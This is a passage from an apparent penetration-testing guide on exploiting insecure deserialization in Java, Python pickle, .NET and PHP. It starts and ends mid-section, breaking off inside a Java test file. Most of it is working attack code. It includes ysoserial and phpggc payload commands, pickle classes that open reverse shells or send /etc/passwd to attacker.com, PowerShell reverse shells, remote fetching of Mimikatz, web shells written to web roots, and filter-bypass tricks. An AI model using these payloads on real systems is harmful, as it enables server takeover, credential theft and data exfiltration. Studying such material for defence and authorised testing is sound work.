java -jar ysoserial-all.jar JRMPClient 'attacker.com:1389' | base64
```

**Blind exploitation confirmation:**

```bash
# DNS exfiltration
java -jar ysoserial-all.jar CommonsCollections6 'nslookup $(whoami).attacker.com'

# HTTP callback
java -jar ysoserial-all.jar CommonsCollections6 'curl http://attacker.com/$(id | base64)'

# File-based marker
java -jar ysoserial-all.jar CommonsCollections6 'touch /tmp/$(date +%s)'
```

### Framework-Specific Exploitation

**Apache Shiro (CVE-2016-4437):**

```bash
# Shiro uses AES/CBC/PKCS5Padding with hardcoded key
# rememberMe cookie is deserialized

# Generate payload with known key
python3 shiro_exploit.py -u http://target.com -g CommonsCollections6 -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
```

**WebLogic T3 Protocol:**

```bash
# Use weblogic_exploit.py or custom T3 client
python3 weblogic_exploit.py -t 192.168.1.10 -p 7001 -g CommonsCollections1 -c 'id'
```

**Jenkins CLI (CVE-2015-8103, CVE-2016-0792):**

```bash
# Exploit pre-auth RCE
java -jar ysoserial-all.jar CommonsCollections1 'wget http://attacker.com/shell.sh -O /tmp/s.sh && bash /tmp/s.sh' | \
  java -jar jenkins-cli.jar -s http://target.com:8080 who-am-i
```

---

## Python Pickle Exploitation

### Fundamentals

Python's pickle module serializes objects into byte streams. The pickle protocol allows arbitrary Python code execution during deserialization via `__reduce__` magic method. Unlike Java, pickle exploitation is straightforward - any pickled object can achieve RCE without gadget chains.

**Pickle signature:**

- Magic bytes vary by protocol (0-5)
- Protocol 0: Human-readable, starts with `(` or `c`
- Protocol 2+: Binary, starts with `\x80\x02`, `\x80\x03`, `\x80\x04`

### Detection

```bash
# Identify pickle data
file suspicious_data  # Look for "python pickle"
python3 -c "import pickle; print(pickle.loads(open('data','rb').read()))"

# Check for base64-encoded pickle
echo "gASVLgAAAAAAAACMCF9fbWFpbl9flIwJcmV2c2hlbGyUk5Qu" | base64 -d | xxd

# Common locations:
# - Flask session cookies
# - Django session data
# - Redis cached objects
# - ML model files (.pkl, .pickle)
# - Job queue messages (Celery, RQ)
```

### Basic Exploitation

**Simple RCE payload:**

```python
import pickle
import base64
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('nc -e /bin/bash attacker.com 4444',))

payload = pickle.dumps(Exploit())
print(base64.b64encode(payload).decode())
```

**Direct command execution:**

```python
import pickle
import base64

# Using eval
payload = b"c__builtin__\neval\n(S'__import__(\"os\").system(\"id\")'\ntR."
print(base64.b64encode(payload).decode())

# Using subprocess
class RCE:
    def __reduce__(self):
        import subprocess
        return (subprocess.Popen, (('bash','-c','bash -i >& /dev/tcp/attacker.com/4444 0>&1'),))

print(base64.b64encode(pickle.dumps(RCE())).decode())
```

**Reading files:**

```python
class ReadFile:
    def __reduce__(self):
        return (exec, ("open('/etc/passwd').read()",))

payload = pickle.dumps(ReadFile())
```

### Advanced Payloads

**Reverse shell with socket:**

```python
import pickle
import base64

class ReverseShell:
    def __reduce__(self):
        import socket, subprocess, os
        return (exec, ("""
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("attacker.com",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
""",))

print(base64.b64encode(pickle.dumps(ReverseShell())))
```

**Multi-stage payload:**

```python
class Stage1:
    def __reduce__(self):
        import urllib.request
        return (exec, ("exec(urllib.request.urlopen('http://attacker.com/stage2.py').read())",))
```

**Blind exfiltration:**

```python
class Exfil:
    def __reduce__(self):
        import urllib.request, base64
        cmd = "import base64,urllib.request; urllib.request.urlopen('http://attacker.com/?data=' + base64.b64encode(open('/etc/passwd','rb').read()).decode())"
        return (exec, (cmd,))
```

### Protocol-Specific Techniques

**Protocol 0 (human-readable):**

```python
# Direct opcode manipulation
payload = b"""cos
system
(S'id'
tR."""

# This deserializes to: os.system('id')
```

**Protocol 2+ (binary, more compact):**

```python
import pickle
import pickletools

# Generate and optimize
payload = pickle.dumps(Exploit(), protocol=2)
optimized = pickletools.optimize(payload)
```

### Framework-Specific Exploitation

**Flask session cookie:**

```python
# Flask uses itsdangerous for signed cookies
# If secret_key is known or weak:

from flask.sessions import SecureSignCookieSessionInterface
import pickle
import base64

class RCE:
    def __reduce__(self):
        import os
        return (os.system, ('id',))

# Forge session
session_serializer = SecureSignCookieSessionInterface()
payload = pickle.dumps(RCE())
# Sign with known/cracked secret_key
# [Inference] Requires knowledge of Flask's secret_key through other means
```

**Django session:**

```bash
# Django stores pickled session data in database or cache
# If you can write to session storage:

python3 -c "
import django.contrib.sessions.serializers
import pickle, base64

class RCE:
    def __reduce__(self):
        import os
        return (os.system, ('whoami',))

print(base64.b64encode(pickle.dumps(RCE())))
"
```

**Celery tasks:**

```python
# Celery can use pickle for message serialization
# If Redis/RabbitMQ is accessible:

import pickle
from celery import Celery

class MaliciousTask:
    def __reduce__(self):
        import os
        return (os.system, ('nc -e /bin/bash attacker.com 4444',))

# Inject into task queue
# [Inference] Requires access to message broker
```

### Exploitation Tools

**Pickle payload generator script:**

```python
#!/usr/bin/env python3
# pickle_exploit.py
import pickle
import base64
import sys

class Exploit:
    def __init__(self, command):
        self.command = command
    
    def __reduce__(self):
        import os
        return (os.system, (self.command,))

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} 'command'")
        sys.exit(1)
    
    cmd = sys.argv[1]
    payload = pickle.dumps(Exploit(cmd))
    print("Raw bytes:")
    print(payload)
    print("\nBase64:")
    print(base64.b64encode(payload).decode())
    print("\nURL-encoded:")
    from urllib.parse import quote
    print(quote(payload))
```

**Testing for pickle injection:**

```bash
# Generate test payload
python3 pickle_exploit.py 'sleep 10' > payload.pkl

# Send via HTTP
curl -X POST http://target.com/api/process \
  -H "Content-Type: application/octet-stream" \
  --data-binary @payload.pkl

# Monitor timing for blind confirmation
time curl http://target.com/vulnerable_endpoint --data "data=$(cat payload.pkl | base64)"
```

### Defense Bypass

**Restricted environment escape:**

```python
# If __builtins__ is restricted
class Bypass:
    def __reduce__(self):
        # Access builtins through subclasses
        return (eval, ("().__class__.__bases__[0].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].system('id')",))
```

**Opcode-level manipulation for signature evasion:**

```python
import pickletools
import pickle
import io

# Generate payload
payload = pickle.dumps(Exploit('whoami'))

# Disassemble, modify opcodes, reassemble
# [Inference] This technique may evade simple signature-based detection
ops = list(pickletools.genops(payload))
# Manually craft bytecode to avoid common patterns
```

---

## .NET Deserialization

### Fundamentals

.NET serialization formats include BinaryFormatter, XmlSerializer, DataContractSerializer, JSON.NET, and others. Like Java, exploitation typically requires gadget chains. .NET deserialization vulnerabilities are common in ASP.NET ViewState, WCF services, and remoting endpoints.

**Common signatures:**

- BinaryFormatter: Starts with `00 01 00 00 00 ff ff ff ff` or Base64: `AAEAAAD/////`
- SoapFormatter: XML with `<SOAP-ENV:Envelope>`
- ViewState: `__VIEWSTATE` parameter in ASP.NET forms
- JSON.NET with TypeNameHandling: JSON with `$type` property

### Detection

```bash
# Identify BinaryFormatter serialized data
echo "AAEAAAD/////AQAAAAAAAAAMAgAAAE1TeXN0ZW0..." | base64 -d | xxd | head

# ASP.NET ViewState
# Look for __VIEWSTATE hidden field in forms
# ViewState is Base64-encoded and may be encrypted/signed

# Check for JSON.NET type hints
grep -r '\$type' responses/
```

### Exploitation Tools

**ysoserial.net - .NET gadget payload generator:**

```powershell
# Download from https://github.com/pwntester/ysoserial.net/releases
# Windows usage:

# List formatters and gadgets
ysoserial.exe -h

# Generate BinaryFormatter payload (ObjectDataProvider gadget)
ysoserial.exe -f BinaryFormatter -g ObjectDataProvider -o base64 -c "cmd /c whoami"

# Generate SoapFormatter payload
ysoserial.exe -f SoapFormatter -g TextFormattingRunProperties -o base64 -c "powershell -enc <base64_payload>"

# Generate JSON.NET payload
ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "calc.exe"

# ViewState payload (if machineKey is known)
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c echo vulnerable > C:\temp\pwned.txt" --path="/about.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="<key>" --validationalg="SHA1" --validationkey="<key>"
```

**Linux usage with Mono:**

```bash
# Install Mono
apt-get install mono-complete

# Run ysoserial.net
mono ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c "bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'"
```

### Common Gadget Chains

**ObjectDataProvider (requires System.Xaml):**

```csharp
// Executes arbitrary processes
// Available in: BinaryFormatter, SoapFormatter, NetDataContractSerializer
ysoserial.exe -g ObjectDataProvider -f BinaryFormatter -c "cmd /c whoami"
```

**TextFormattingRunProperties (requires PresentationFramework):**

```csharp
// RCE via XAML parsing
// Generally reliable across .NET Framework versions
ysoserial.exe -g TextFormattingRunProperties -f SoapFormatter -c "powershell IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')"
```

**TypeConfuseDelegate:**

```csharp
// Delegates execution through type confusion
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "calc.exe"
```

**PSObject (PowerShell required):**

```csharp
// Executes PowerShell directly
ysoserial.exe -g PSObject -f BinaryFormatter -c "Get-Process"
```

### ASP.NET ViewState Exploitation

**ViewState structure:**

- Base64-encoded serialized data
- May be encrypted (requiresEncryption) and/or signed (EnableViewStateMac)
- Validation uses machineKey from web.config or machine.config

**Exploit ViewState without validation:**

```bash
# If ViewState MAC is disabled (EnableViewStateMac=false)
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c whoami" --path="/page.aspx" --apppath="/" --islegacy
```

**Exploit with known machineKey:**

```bash
# machineKey can be found in:
# - web.config
# - machine.config
# - Leaked in error messages
# - Brute-forced (legacy .NET 1.1/2.0)

ysoserial.exe -p ViewState \
  -g TypeConfuseDelegate \
  -c "powershell -enc <encoded_payload>" \
  --path="/target.aspx" \
  --apppath="/" \
  --decryptionalg="AES" \
  --decryptionkey="1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF" \
  --validationalg="HMACSHA256" \
  --validationkey="1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF"

# Send in POST request
curl -X POST http://target.com/page.aspx \
  --data "__VIEWSTATE=<generated_payload>&__EVENTVALIDATION=&btnSubmit=Submit"
```

**ViewState machineKey discovery:**

```bash
# Use Blacklist3r for automated scanning
# [Unverified - tool reliability not confirmed]
python3 Blacklist3r.py -u http://target.com -w wordlist.txt

# Manual ASP.NET error disclosure
# Trigger errors that may reveal machineKey in stack traces
```

### JSON.NET TypeNameHandling Exploitation

**Vulnerable configuration:**

```csharp
// Application uses TypeNameHandling.All or TypeNameHandling.Auto
JsonConvert.DeserializeObject(userInput, new JsonSerializerSettings 
{
    TypeNameHandling = TypeNameHandling.All
});
```

**Exploitation payload:**

```bash
# Generate JSON.NET payload
ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "cmd /c whoami" -t

# Result (example):
{
  "$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "MethodName":"Start",
  "ObjectInstance":{
    "$type":"System.Diagnostics.Process, System"
  },
  "MethodParameters":{
    "$type":"System.Collections.ArrayList, mscorlib",
    "$values":["cmd","/c whoami"]
  }
}

# Send to vulnerable endpoint
curl -X POST http://target.com/api/deserialize \
  -H "Content-Type: application/json" \
  -d '@payload.json'
```

### WCF Service Exploitation

**NetDataContractSerializer vulnerabilities:**

```bash
# If WCF endpoint uses NetDataContractSerializer
# Create SOAP envelope with malicious payload

ysoserial.exe -f NetDataContractSerializer -g TypeConfuseDelegate -c "calc.exe" -o raw

# Wrap in SOAP envelope and send
curl -X POST http://target.com/service.svc \
  -H "Content-Type: text/xml; charset=utf-8" \
  -H "SOAPAction: http://tempuri.org/IService/Method" \
  -d @soap_payload.xml
```

### Remoting Exploitation

**.NET Remoting with BinaryFormatter:**

```bash
# .NET Remoting services often use BinaryFormatter over TCP
# Use ysoserial.exe with raw output

# Generate payload
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "cmd /c net user hacker Password123! /add" -o raw > payload.bin

# Send to remoting endpoint
# [Inference] Requires custom client or tool like ExploitRemotingService
nc target.com 8080 < payload.bin
```

### Windows-Specific Payloads

**PowerShell reverse shell:**

```powershell
# Generate encoded PowerShell command
$command = '$client = New-Object System.Net.Sockets.TCPClient("attacker.com",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
echo $encodedCommand

# Use in ysoserial
ysoserial.exe -g ObjectDataProvider -f BinaryFormatter -c "powershell -enc $encodedCommand"
```

**Credential dumping:**

```bash
# Mimikatz one-liner
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "powershell -c IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
```

### Advanced Techniques

**Bypassing restricted gadgets:**

```csharp
// If common gadgets are blacklisted, find alternative chains
// [Inference] May require custom gadget chain research
// Use gadget chain discovery tools or manual analysis
```

**Type confusion attacks:**

```bash
# Exploit weakly-typed deserializers
# Craft payloads that confuse type resolution
# [Unverified] Success depends on application's type binder implementation
```

---

## PHP Object Injection

### Fundamentals

PHP's `unserialize()` function reconstructs objects from serialized strings. When attacker-controlled data is unserialized, magic methods (`__wakeup`, `__destruct`, `__toString`, etc.) are automatically invoked, potentially triggering gadget chains leading to RCE, SQLi, or arbitrary file operations.

**PHP serialization format:**

```
O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}
```

- `O`: Object
- `4`: Class name length
- `"User"`: Class name
- `2`: Number of properties
- `s:4:"name"`: String property, length 4, value "name"

### Detection

```bash
# Look for serialized PHP objects in:
# - Cookies
# - POST/GET parameters
# - Session files (/var/lib/php/sessions/)
# - Cache files
# - Database fields

# Identify serialized data
echo 'O:4:"User":1:{s:4:"name";s:5:"admin";}' | grep -E '^[aObsid]:[0-9]+'

# Check for vulnerable unserialize() calls
grep -r "unserialize(\$_" /var/www/html/
```

### Magic Methods Exploited

**__wakeup()**: Called on unserialize() **__destruct()**: Called when object is destroyed **__toString()**: Called when object is treated as string **__call()**: Called on inaccessible methods **__get()**: Called when reading inaccessible properties **__set()**: Called when writing to inaccessible properties

### Basic Exploitation

**Simple RCE via __destruct():**

```php
<?php
class Evil {
    public $cmd;
    
    function __destruct() {
        system($this->cmd);
    }
}

// Create exploit
$obj = new Evil();
$obj->cmd = "whoami";
echo serialize($obj);
// Output: O:4:"Evil":1:{s:3:"cmd";s:6:"whoami";}
?>
```

**Exploitation workflow:**

```bash
# 1. Create malicious object
php -r '$obj = new stdClass(); $obj->cmd="id"; echo serialize($obj);'

# 2. Inject via vulnerable parameter
curl http://target.com/page.php?data=O:8:"stdClass":1:{s:3:"cmd";s:2:"id";}

# 3. Trigger unserialize and monitor for execution
````

### Property-Oriented Programming (POP) Chains

**Finding gadget chains:**
```bash
# Manual source code analysis
grep -r "__destruct\|__wakeup\|__toString" /var/www/html/

# Look for dangerous functions in magic methods:
# - eval(), system(), exec(), shell_exec()
# - file_put_contents(), unlink(), include()
# - mysqli_query(), PDO::query()
````

**Example POP chain:**

```php
<?php
// File: class1.php
class Logger {
    public $logFile;
    public $message;
    
    function __destruct() {
        file_put_contents($this->logFile, $this->message);
    }
}

// File: class2.php  
class Template {
    public $cacheFile;
    
    function __toString() {
        return file_get_contents($this->cacheFile);
    }
}

// Exploitation: Chain Logger.__destruct() + Template.__toString()
$template = new Template();
$template->cacheFile = "/etc/passwd";

$logger = new Logger();
$logger->logFile = "/tmp/output.txt";
$logger->message = $template; // __toString() triggered when $template converted to string

echo serialize($logger);
// Writes contents of /etc/passwd to /tmp/output.txt
?>
```

### Framework-Specific Exploitation

**WordPress (various plugins):**

```php
<?php
// Example: Vulnerable plugin with file deletion
class WPPlugin {
    public $filePath;
    
    function __destruct() {
        if (file_exists($this->filePath)) {
            unlink($this->filePath);
        }
    }
}

$exploit = new WPPlugin();
$exploit->filePath = "/var/www/html/.htaccess";
echo serialize($exploit);
// Payload: O:8:"WPPlugin":1:{s:8:"filePath";s:27:"/var/www/html/.htaccess";}
?>
```

**Laravel (CVE-2018-15133):**

```php
<?php
// Laravel <= 5.6.29 RCE via __destruct() chain
// Requires: Monolog\Handler\SyslogUdpHandler

namespace Illuminate\Broadcasting;

class PendingBroadcast {
    protected $events;
    protected $event;
    
    function __construct($events, $event) {
        $this->events = $events;
        $this->event = $event;
    }
}

// Craft exploit using multiple chained objects
// [Inference] Full exploit chain requires multiple classes
// Simplified example - real exploitation more complex
?>
```

**Symfony (CVE-2019-18889):**

```bash
# Symfony secret_key exposure + deserialization
# If SYMFONY_SECRET is known, craft signed payload

# Generate payload using phpggc
phpggc Symfony/RCE4 system id
```

### Exploitation Tools

**PHPGGC - PHP Generic Gadget Chains:**

```bash
# Installation
git clone https://github.com/ambionics/phpggc
cd phpggc

# List available gadget chains
./phpggc -l

# Generate payload for Laravel RCE
./phpggc Laravel/RCE1 system id

# Generate payload with specific output format
./phpggc Laravel/RCE1 system whoami -b  # Base64
./phpggc Laravel/RCE1 system whoami -u  # URL-encoded
./phpggc Laravel/RCE1 system whoami -j  # JSON

# Monolog RCE (common library)
./phpggc Monolog/RCE1 system 'wget http://attacker.com/shell.php -O /tmp/shell.php'

# WordPress File Delete
./phpggc WordPress/P1 /var/www/html/wp-config.php

# Symfony RCE
./phpggc Symfony/RCE4 system 'nc -e /bin/bash attacker.com 4444'

# CakePHP RCE
./phpggc CakePHP/RCE1 system 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'

# Guzzle (HTTP client library)
./phpggc Guzzle/FW1 /tmp/shell.php /var/www/html/shell.php

# Custom gadget with wrapper
./phpggc Laravel/RCE1 system id -w phar -o exploit.phar
```

**Manual payload crafting:**

```bash
# Create exploit script
cat > exploit.php <<'EOF'
<?php
class Evil {
    public $cmd = "id";
    function __destruct() {
        system($this->cmd);
    }
}

echo serialize(new Evil());
?>
EOF

php exploit.php | base64

# Use in request
curl "http://target.com/vuln.php?data=$(php exploit.php | base64)"
```

### Advanced Techniques

**Phar deserialization (CVE-2018-?????):**

```php
<?php
// PHAR files contain serialized metadata
// Any file operation on phar:// wrapper triggers deserialization

class Exploit {
    public $cmd = "whoami";
    function __destruct() {
        system($this->cmd);
    }
}

// Create malicious PHAR
$phar = new Phar('exploit.phar');
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->addFromString('test.txt', 'test');
$phar->setMetadata(new Exploit());
$phar->stopBuffering();

// Trigger via file operations
file_exists('phar://exploit.phar/test.txt');
file_get_contents('phar://exploit.phar/test.txt');
include('phar://exploit.phar/test.txt');
?>
```

**Exploiting phar:// wrapper:**

```bash
# Upload exploit.phar as image (bypass validation)
# Then trigger via:
curl "http://target.com/file_check.php?file=phar://uploads/exploit.phar/test.txt"

# Common vulnerable functions:
# file_exists(), file_get_contents(), file(), fopen()
# include(), require(), getimagesize(), exif_read_data()
```

**Session poisoning:**

```bash
# If session file is readable and writable
# Session files often stored at /var/lib/php/sessions/sess_<PHPSESSID>

# 1. Create session with serialized payload
curl http://target.com/ --cookie "PHPSESSID=exploit"

# 2. Inject malicious data into session
# [Inference] Requires write access to session storage or session handler vulnerability

# 3. Session file contains: <session_var>|<serialized_data>
# Exploit by setting session variable to crafted object
```

**Property manipulation bypasses:**

```php
<?php
// Bypass property count checks
// If code checks number of properties:

class User {
    public $name = "admin";
    public $role = "user";
}

// Serialize with manipulated property count
$serialized = 'O:4:"User":3:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";s:8:"isAdmin";b:1;}';
// Property count is 3 but only 2 declared - PHP ignores extra
?>
```

**Bypassing __wakeup() via CVE-2016-7124:**

```php
<?php
// PHP 5.x - 7.0.10: Manipulate property count to skip __wakeup()

class Exploit {
    public $cmd = "id";
    
    function __wakeup() {
        // Security check here
        $this->cmd = "echo safe";
    }
    
    function __destruct() {
        system($this->cmd);
    }
}

// Normal serialization
$normal = serialize(new Exploit());
// O:7:"Exploit":1:{s:3:"cmd";s:2:"id";}

// Exploit: Change property count to higher value
$bypass = 'O:7:"Exploit":2:{s:3:"cmd";s:2:"id";}';
// __wakeup() is skipped, __destruct() still called with original $cmd
?>
```

**Type juggling in deserialization:**

```php
<?php
// Exploit loose comparison in authentication

class User {
    public $password;
    
    function checkPassword($input) {
        return $this->password == $input; // Loose comparison
    }
}

// Craft object with boolean true
$exploit = 'O:4:"User":1:{s:8:"password";b:1;}';
// true == "any_string" evaluates to true in PHP
?>
```

### Linux-Specific File Operations

**Web shell upload via file_put_contents():**

```php
<?php
class FileWriter {
    public $file = "/var/www/html/shell.php";
    public $data = "<?php system($_GET['cmd']); ?>";
    
    function __destruct() {
        file_put_contents($this->file, $this->data);
    }
}

echo serialize(new FileWriter());
// Writes web shell to document root
?>
```

**Log poisoning:**

```php
<?php
class Logger {
    public $logFile = "/var/log/apache2/access.log";
    public $payload;
    
    function __toString() {
        return $this->payload;
    }
}

// Inject PHP code into log via User-Agent
// Then include log file via LFI
?>
```

### Defense Bypass Techniques

**String escaping for protected properties:**

```php
<?php
// Protected properties serialize with null bytes
// Format: \x00*\x00propertyName

class Test {
    protected $cmd = "id";
}

// Manual crafting with null bytes
$payload = 'O:4:"Test":1:{s:7:"\x00*\x00cmd";s:6:"whoami";}';
?>
```

**Bypassing input filters:**

```bash
# URL encode null bytes
%00 = \x00

# Double encoding
%2500 = %00

# Unicode normalization
# [Inference] May bypass simple pattern matching

# Newline injection to break regex
O:4:"Evil":1:{s:3:"cmd";s:10:"id
whoami";}
```

**Exploiting unserialize() in include chains:**

```php
<?php
// If unserialize() result passed to include()
class FileInclude {
    public $file = "php://filter/convert.base64-encode/resource=/etc/passwd";
    
    function __toString() {
        return $this->file;
    }
}

// Chain with include() vulnerability
// O:11:"FileInclude":1:{s:4:"file";s:57:"php://filter/convert.base64-encode/resource=/etc/passwd";}
?>
```

---

## Gadget Chain Exploitation

### Fundamentals

Gadget chains are sequences of method calls across multiple classes that, when triggered through deserialization, result in dangerous operations. Unlike direct exploitation, gadget chains leverage legitimate application code to achieve malicious goals. This technique is critical for exploiting modern deserialization vulnerabilities where direct RCE gadgets are unavailable.

### Gadget Chain Components

**Source (Entry Point):**

- Magic methods in Java: `readObject()`, `readResolve()`
- Magic methods in .NET: Type constructor, property setters
- Magic methods in PHP: `__wakeup()`, `__destruct()`, `__toString()`
- Magic methods in Python: `__reduce()`, `__reduce_ex()`, `__setstate__()`

**Sink (Dangerous Operation):**

- Command execution: `Runtime.exec()`, `ProcessBuilder.start()`, `eval()`
- File operations: `FileWriter.write()`, `File.delete()`
- SQL execution: `Statement.execute()`, `PreparedStatement.execute()`
- JNDI/LDAP: `InitialContext.lookup()`, `NameFactory.getObjectInstance()`
- Reflection: `Method.invoke()`, `Constructor.newInstance()`

**Chain (Intermediate Steps):**

- Property getters/setters
- `toString()`, `hashCode()`, `equals()` implementations
- Proxy invocation handlers
- Comparators and collections

### Gadget Discovery Methodology

**Manual source analysis:**

```bash
# Java: Find magic methods
grep -r "private void readObject" /path/to/source/
grep -r "readResolve" /path/to/source/

# Find dangerous sinks
grep -r "Runtime.getRuntime().exec" /path/to/source/
grep -r "ProcessBuilder" /path/to/source/

# PHP: Find magic methods and sinks
grep -r "function __destruct\|function __wakeup" /var/www/
grep -r "system(\|exec(\|shell_exec(\|eval(" /var/www/

# .NET: Decompile and search
# Use dnSpy or ILSpy to analyze assemblies
```

**Automated gadget mining:**

```bash
# GadgetInspector for Java (automated chain discovery)
git clone https://github.com/JackOfMostTrades/gadgetinspector
cd gadgetinspector
./gradlew shadowJar

# Analyze target JAR
java -jar build/libs/gadgetinspector-all.jar target-app.jar

# Output: Potential gadget chains in gadget-chains.txt
```

**Dynamic analysis:**

```bash
# Java: Use SerializationDumper to inspect serialized objects
git clone https://github.com/NickstaDB/SerializationDumper
cd SerializationDumper
javac SerializationDumper.java

# Dump serialized stream
java SerializationDumper serialized_data.bin

# Identify classes and references for chain building
```

### Java Gadget Chain Examples

**CommonsCollections1 detailed breakdown:**

```java
// Chain: AnnotationInvocationHandler.readObject()
//        -> LazyMap.get()
//        -> ChainedTransformer.transform()
//        -> InvokerTransformer.transform()
//        -> Runtime.exec()

// Step 1: readObject() calls memberValues.entrySet()
// Step 2: LazyMap.get() is invoked via Proxy
// Step 3: ChainedTransformer chains multiple Transformers
// Step 4: InvokerTransformer uses reflection to call methods
// Step 5: Final transformer executes Runtime.exec()

// Generate with ysoserial
java -jar ysoserial-all.jar CommonsCollections1 'command'
```

**CommonsCollections6 (more stable variant):**

```java
// Chain: HashSet.readObject()
//        -> HashMap.put()
//        -> TiedMapEntry.hashCode()
//        -> LazyMap.get()
//        -> ChainedTransformer.transform()
//        -> InvokerTransformer.transform()
//        -> Runtime.exec()

// More reliable because it doesn't rely on AnnotationInvocationHandler
java -jar ysoserial-all.jar CommonsCollections6 'command'
```

**Spring Framework gadget chain:**

```java
// Uses org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider
// Chain leads to Method.invoke() with controlled parameters

java -jar ysoserial-all.jar Spring1 'command'
java -jar ysoserial-all.jar Spring2 'command'
```

### .NET Gadget Chain Examples

**ObjectDataProvider chain:**

```csharp
// System.Windows.Data.ObjectDataProvider in PresentationFramework
// Allows calling arbitrary methods with parameters

// Chain:
// 1. ObjectDataProvider.MethodName set to "Start"
// 2. ObjectInstance set to System.Diagnostics.Process
// 3. MethodParameters contains command arguments
// 4. During deserialization, Start() is invoked

ysoserial.exe -g ObjectDataProvider -f BinaryFormatter -c "cmd /c whoami"
```

**TextFormattingRunProperties chain:**

```csharp
// Uses System.Windows.Data.ObjectDataProvider via XAML parsing
// Chain: BinaryFormatter -> TextFormattingRunProperties
//        -> XamlReader.Parse() -> ObjectDataProvider

ysoserial.exe -g TextFormattingRunProperties -f BinaryFormatter -c "calc.exe"
```

**TypeConfuseDelegate chain:**

```csharp
// Exploits delegate serialization and type confusion
// MulticastDelegate with confused types leads to arbitrary invocation

// Chain:
// 1. Serialize MulticastDelegate with confused target type
// 2. During deserialization, delegate invoked with controlled parameters
// 3. Results in method call to dangerous function

ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "command"
```

### PHP Gadget Chain Examples

**Monolog RCE chain:**

```php
<?php
// Monolog\Handler\SyslogUdpHandler
// Chain: __destruct() -> write() -> getFormatter() -> format()
//        -> BufferHandler.__destruct() -> close() -> handle()

// Generate with phpggc
./phpggc Monolog/RCE1 system whoami

// Detailed chain:
// 1. SyslogUdpHandler.__destruct() calls close()
// 2. close() calls write() for buffered records
// 3. write() eventually triggers string formatting
// 4. Crafted formatter contains malicious code
?>
```

**Symfony RCE chain:**

```php
<?php
// Symfony 3.4.x - 4.2.x
// Uses Symfony\Component\Cache\Adapter\TagAwareAdapter

// Chain: __destruct() -> commit() -> invalidateTags()
//        -> doDelete() -> eval()

./phpggc Symfony/RCE4 system id

// Exploitation steps:
// 1. TagAwareAdapter.__destruct() triggers cleanup
// 2. invalidateTags() processes array of tags
// 3. Crafted tag structure leads to eval() in cache handling
?>
```

**WordPress plugin chains:**

```php
<?php
// Example: Generic WordPress plugin vulnerability pattern

// Chain: Plugin.__destruct() -> save_settings()
//        -> file_put_contents() with controlled path/data

class VulnPlugin {
    public $settings_file = "/var/www/html/shell.php";
    public $settings = "<?php system($_GET['c']); ?>";
    
    function __destruct() {
        file_put_contents($this->settings_file, $this->settings);
    }
}
?>
```

### Python Gadget Chain Examples

**SQLAlchemy deserialization to SQL injection:**

```python
# While Python pickle doesn't need gadget chains for RCE,
# chains exist for specific attack types

class SQLInjection:
    def __reduce__(self):
        import sqlalchemy
        # [Inference] Craft query object that leads to SQL injection
        # Requires detailed knowledge of target's ORM usage
        pass
```

**Django cache poisoning chain:**

```python
# Chain to inject malicious data into Django cache
# Then trigger code execution via cached template

class CachePoison:
    def __reduce__(self):
        from django.core.cache import cache
        # Poison cache with malicious template
        return (cache.set, ('template_key', '{{malicious_code}}'))
```

### Building Custom Gadget Chains

**Step 1: Enumerate available classes**

```bash
# Java: Extract class list from JAR
jar -tf application.jar | grep "\.class$" | sed 's/\.class$//' | tr '/' '.'

# .NET: Use ildasm or dnSpy
ildasm /out=dump.txt application.dll

# PHP: Parse composer.json and autoload files
find vendor/ -name "*.php" -exec grep -l "class " {} \;
```

**Step 2: Map dangerous sinks**

```bash
# Create list of methods that perform dangerous operations
# Java example:
Runtime.exec
ProcessBuilder.start
ScriptEngineManager.eval
javax.naming.InitialContext.lookup
java.lang.reflect.Method.invoke

# Search for these in decompiled code
```

**Step 3: Trace backwards from sink**

```java
// Example: Find path from readObject() to Runtime.exec()

// Sink: Runtime.getRuntime().exec(cmd)
// Who calls exec()? -> SomeTransformer.transform()
// Who calls transform()? -> ChainedTransformer.transform()
// Who calls ChainedTransformer? -> LazyMap.get()
// How to trigger LazyMap.get()? -> Proxy invocation in readObject()
```

**Step 4: Validate chain**

```bash
# Test chain manually with custom serialization code

# Java example:
cat > TestChain.java <<'EOF'
import java.io.*;

public class TestChain {
